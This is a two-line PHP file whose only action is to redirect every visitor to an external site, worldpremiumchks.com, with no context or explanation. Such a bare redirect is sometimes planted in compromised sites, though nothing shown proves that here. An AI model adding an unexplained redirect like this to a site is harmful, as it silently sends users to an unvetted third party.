<?php

header("Location: https://worldpremiumchks.com/");
